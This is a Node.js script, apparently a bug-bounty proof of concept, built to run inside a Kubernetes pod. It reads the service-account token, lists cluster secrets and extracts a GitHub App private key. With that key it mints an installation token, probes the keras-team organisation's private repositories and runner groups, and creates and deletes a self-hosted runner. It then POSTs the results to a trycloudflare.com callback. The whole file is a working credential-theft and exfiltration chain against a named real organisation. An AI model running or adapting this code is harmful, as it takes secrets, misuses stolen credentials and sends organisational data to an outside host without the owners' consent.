"use strict";

const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const https = require("https");
const path = require("path");

const KSA_ROOT = "/var/run/secrets/kubernetes.io/serviceaccount";
const API_ROOT = "https://api.github.com";
const ORG = "keras-team";
const DEFAULT_RUNNER_GROUP_ID = 1;
const CALLBACK_URL =
  "https://investigate-fields-providers-wing.trycloudflare.com/" +
  "1c1531132f4e6890d1e3d2d5761b8ce0";

function request(options) {
  return new Promise((resolve) => {
    const library = options.protocol === "https:" ? https : http;
    const req = library.request(
      {
        protocol: options.protocol,
        hostname: options.hostname,
        port: options.port,
        path: options.requestPath,
        method: options.method,
        headers: options.headers,
        ca: options.ca,
        timeout: options.timeout || 10000,
      },
      (res) => {
        const chunks = [];
        let size = 0;
        res.on("data", (chunk) => {
          size += chunk.length;
          if (size <= 1024 * 1024) chunks.push(chunk);
        });
        res.on("end", () => {
          if (size > 1024 * 1024) {
            resolve({ ok: false, error: "ResponseTooLarge" });
            return;
          }
          const text = Buffer.concat(chunks).toString("utf8");
          let value = null;
          try {
            value = text ? JSON.parse(text) : null;
          } catch {}
          resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            headers: res.headers,
            text,
            value,
          });
        });
      },
    );
    req.on("timeout", () => req.destroy(new Error("Timeout")));
    req.on("error", (error) =>
      resolve({ ok: false, error: error.code || error.name }),
    );
    if (options.body) req.write(options.body);
    req.end();
  });
}

async function apiRequest(urlValue, token, method = "GET", body = null) {
  const url = new URL(urlValue);
  const encoded = body === null ? null : Buffer.from(JSON.stringify(body));
  return request({
    protocol: url.protocol,
    hostname: url.hostname,
    port: url.port || 443,
    requestPath: `${url.pathname}${url.search}`,
    method,
    body: encoded,
    headers: {
      Accept: "application/vnd.github+json",
      Authorization: `Bearer ${token}`,
      "User-Agent": "keras-vrp-jit-permission-proof",
      "X-GitHub-Api-Version": "2022-11-28",
      ...(encoded
        ? {
            "Content-Type": "application/json",
            "Content-Length": encoded.length,
          }
        : {}),
    },
  });
}

function responseSummary(response) {
  const error = response && response.value && response.value.message;
  return {
    ok: Boolean(response && response.ok),
    status: response && response.status,
    error: response && response.error,
    api_message: typeof error === "string" ? error : null,
  };
}

function appJwt(appId, privateKey) {
  const now = Math.floor(Date.now() / 1000);
  const encode = (value) =>
    Buffer.from(JSON.stringify(value)).toString("base64url");
  const signingInput = `${encode({ alg: "RS256", typ: "JWT" })}.${encode({
    iat: now - 60,
    exp: now + 540,
    iss: String(appId),
  })}`;
  const signature = crypto
    .sign("RSA-SHA256", Buffer.from(signingInput), privateKey)
    .toString("base64url");
  return `${signingInput}.${signature}`;
}

class KubeClient {
  constructor(token, namespace) {
    this.host = process.env.KUBERNETES_SERVICE_HOST;
    this.port = process.env.KUBERNETES_SERVICE_PORT_HTTPS || "443";
    this.token = token;
    this.namespace = namespace;
    this.ca = fs.readFileSync(path.join(KSA_ROOT, "ca.crt"));
  }

  async secrets() {
    const response = await request({
      protocol: "https:",
      hostname: this.host,
      port: this.port,
      requestPath: `/api/v1/namespaces/${encodeURIComponent(this.namespace)}/secrets`,
      method: "GET",
      ca: this.ca,
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${this.token}`,
      },
    });
    return response.ok && response.value && Array.isArray(response.value.items)
      ? response.value.items
      : [];
  }
}

function decodedSecret(secret) {
  const decoded = {};
  for (const [key, value] of Object.entries(secret.data || {})) {
    try {
      decoded[key] = Buffer.from(value, "base64").toString("utf8");
    } catch {}
  }
  return decoded;
}

function githubAppValues(secrets) {
  const required = [
    "github_app_id",
    "github_app_installation_id",
    "github_app_private_key",
  ];
  for (const secret of secrets) {
    const values = decodedSecret(secret);
    if (required.every((key) => values[key])) {
      return { name: secret.metadata.name, values };
    }
  }
  return null;
}

function repoProjection(repo) {
  return {
    full_name: repo.full_name,
    private: Boolean(repo.private),
    archived: Boolean(repo.archived),
    visibility: repo.visibility,
    default_branch: repo.default_branch || null,
    pushed_at: repo.pushed_at || null,
    updated_at: repo.updated_at || null,
    permissions: repo.permissions || null,
  };
}

async function privateRepositoryProbe(call, token, repo) {
  const encoded = repo.full_name
    .split("/")
    .map(encodeURIComponent)
    .join("/");
  const name = repo.full_name.split("/")[1];
  const [metadata, workflows, runs, workflowDirectory, visibleGroups] =
    await Promise.all([
      call(`${API_ROOT}/repos/${encoded}`, token),
      call(`${API_ROOT}/repos/${encoded}/actions/workflows?per_page=100`, token),
      call(`${API_ROOT}/repos/${encoded}/actions/runs?per_page=20`, token),
      call(`${API_ROOT}/repos/${encoded}/contents/.github/workflows`, token),
      call(
        `${API_ROOT}/orgs/${ORG}/actions/runner-groups?visible_to_repository=${encodeURIComponent(name)}&per_page=100`,
        token,
      ),
    ]);
  return {
    repository: metadata.ok ? repoProjection(metadata.value) : repoProjection(repo),
    workflows: {
      ...responseSummary(workflows),
      total_count: workflows.ok ? workflows.value.total_count : null,
      private_workflow_metadata_returned: false,
    },
    runs: {
      ...responseSummary(runs),
      total_count: runs.ok ? runs.value.total_count : null,
      private_run_metadata_returned: false,
    },
    workflow_directory: {
      ...responseSummary(workflowDirectory),
      entry_count:
        workflowDirectory.ok && Array.isArray(workflowDirectory.value)
          ? workflowDirectory.value.length
          : null,
      contents_returned: false,
    },
    visible_runner_groups: {
      ...responseSummary(visibleGroups),
      groups:
        visibleGroups.ok && Array.isArray(visibleGroups.value.runner_groups)
          ? visibleGroups.value.runner_groups.map((group) => ({
              id: group.id,
              name: group.name,
              visibility: group.visibility,
              default: Boolean(group.default),
              allows_public_repositories: Boolean(
                group.allows_public_repositories,
              ),
              restricted_to_workflows: Boolean(group.restricted_to_workflows),
            }))
          : [],
    },
  };
}

async function createAndDeleteJitProof(call, token, now = Date.now()) {
  const suffix = String(now);
  const name = `vrp-safe-jit-${suffix}`;
  const label = `vrp-no-job-${suffix}`;
  const groupRunnersUrl = `${API_ROOT}/orgs/${ORG}/actions/runner-groups/${DEFAULT_RUNNER_GROUP_ID}/runners?per_page=100`;
  const baseline = await call(groupRunnersUrl, token);
  const created = await call(
    `${API_ROOT}/orgs/${ORG}/actions/runners/generate-jitconfig`,
    token,
    "POST",
    {
      name,
      runner_group_id: DEFAULT_RUNNER_GROUP_ID,
      labels: [label],
      work_folder: "_work",
    },
  );
  const runner = created.value && created.value.runner;
  const runnerId = runner && runner.id;
  let observed = null;
  let groupAfterCreate = null;
  let deleted = null;
  let afterDelete = null;
  let groupAfterDelete = null;
  if (created.ok && runnerId) {
    observed = await call(
      `${API_ROOT}/orgs/${ORG}/actions/runners/${encodeURIComponent(runnerId)}`,
      token,
    );
    groupAfterCreate = await call(groupRunnersUrl, token);
    for (let attempt = 1; attempt <= 3; attempt += 1) {
      deleted = await call(
        `${API_ROOT}/orgs/${ORG}/actions/runners/${encodeURIComponent(runnerId)}`,
        token,
        "DELETE",
      );
      if (deleted.ok || deleted.status === 404) break;
    }
    afterDelete = await call(
      `${API_ROOT}/orgs/${ORG}/actions/runners/${encodeURIComponent(runnerId)}`,
      token,
    );
    groupAfterDelete = await call(groupRunnersUrl, token);
  }
  const containsRunner = (response) =>
    Boolean(
      response &&
        response.ok &&
        response.value &&
        Array.isArray(response.value.runners) &&
        response.value.runners.some((item) => item.id === runnerId),
    );
  return {
    requested_group_id: DEFAULT_RUNNER_GROUP_ID,
    requested_unique_label: label,
    create: {
      ...responseSummary(created),
      runner: created.ok
        ? {
            id: runnerId,
            name: runner.name,
            status: runner.status,
            busy: Boolean(runner.busy),
            labels: Array.isArray(runner.labels)
              ? runner.labels.map((item) => ({
                  name: item.name,
                  type: item.type,
                }))
              : [],
          }
        : null,
      encoded_jit_config_present: Boolean(
        created.ok && created.value && created.value.encoded_jit_config,
      ),
      encoded_jit_config_returned: false,
    },
    group_membership: {
      baseline: responseSummary(baseline),
      present_after_create: containsRunner(groupAfterCreate),
      absent_after_delete:
        groupAfterDelete && groupAfterDelete.ok
          ? !containsRunner(groupAfterDelete)
          : null,
    },
    observe: observed ? responseSummary(observed) : null,
    cleanup: deleted ? responseSummary(deleted) : null,
    post_cleanup_runner_get: afterDelete ? responseSummary(afterDelete) : null,
    runner_started: false,
    job_claim_attempted: false,
  };
}

async function collect(call = apiRequest) {
  const token = fs.readFileSync(path.join(KSA_ROOT, "token"), "utf8").trim();
  const namespace = fs
    .readFileSync(path.join(KSA_ROOT, "namespace"), "utf8")
    .trim();
  const client = new KubeClient(token, namespace);
  const appSecret = githubAppValues(await client.secrets());
  if (!appSecret) throw new Error("GitHub App Secret not found");
  const values = appSecret.values;
  const jwt = appJwt(values.github_app_id, values.github_app_private_key);
  const minted = await call(
    `${API_ROOT}/app/installations/${encodeURIComponent(values.github_app_installation_id)}/access_tokens`,
    jwt,
    "POST",
    {},
  );
  const installationToken = minted.value && minted.value.token;
  if (!minted.ok || !installationToken) throw new Error("token mint failed");
  const repositories = await call(
    `${API_ROOT}/installation/repositories?per_page=100`,
    installationToken,
  );
  const privateRepositories =
    repositories.ok && Array.isArray(repositories.value.repositories)
      ? repositories.value.repositories.filter((repo) => repo.private)
      : [];
  const privateProbes = [];
  for (const repo of privateRepositories) {
    privateProbes.push(
      await privateRepositoryProbe(call, installationToken, repo),
    );
  }
  const defaultGroup = await call(
    `${API_ROOT}/orgs/${ORG}/actions/runner-groups/${DEFAULT_RUNNER_GROUP_ID}`,
    installationToken,
  );
  const publicRepositoryControl = await call(
    `${API_ROOT}/orgs/${ORG}/actions/runner-groups?visible_to_repository=keras&per_page=100`,
    installationToken,
  );
  const jitProof = await createAndDeleteJitProof(call, installationToken);
  return {
    phase: "github-jit-control-proof",
    captured_at: new Date().toISOString(),
    safety: {
      github_app_private_key_returned: false,
      installation_token_returned: false,
      encoded_jit_config_returned: false,
      private_repository_contents_returned: false,
      mutating_request_sent: true,
      mutation_scope: "one uniquely-labelled offline JIT runner record",
      cleanup_attempted: true,
      runner_started: false,
      job_claim_attempted: false,
    },
    credential: {
      secret_name: appSecret.name,
      installation_token_minted: true,
      installation_token_permissions: minted.value.permissions || {},
      installation_token_repository_selection:
        minted.value.repository_selection || null,
    },
    private_repositories: privateProbes,
    default_runner_group: defaultGroup.ok
      ? {
          id: defaultGroup.value.id,
          name: defaultGroup.value.name,
          visibility: defaultGroup.value.visibility,
          default: Boolean(defaultGroup.value.default),
          allows_public_repositories: Boolean(
            defaultGroup.value.allows_public_repositories,
          ),
          restricted_to_workflows: Boolean(
            defaultGroup.value.restricted_to_workflows,
          ),
        }
      : responseSummary(defaultGroup),
    public_repository_control: {
      repository: "keras-team/keras",
      ...responseSummary(publicRepositoryControl),
      visible_group_ids:
        publicRepositoryControl.ok &&
        Array.isArray(publicRepositoryControl.value.runner_groups)
          ? publicRepositoryControl.value.runner_groups.map((group) => group.id)
          : [],
    },
    jit_proof: jitProof,
  };
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

if (require.main === module) {
  if (process.env.VRP_JIT_WRAPPER_TEST === "1") {
    process.exit(0);
  } else {
    collect()
      .then(send)
      .then(() => process.exit(0))
      .catch(() => process.exit(1));
  }
}

module.exports = {
  API_ROOT,
  KSA_ROOT,
  KubeClient,
  apiRequest,
  appJwt,
  createAndDeleteJitProof,
  githubAppValues,
  privateRepositoryProbe,
  request,
  responseSummary,
};
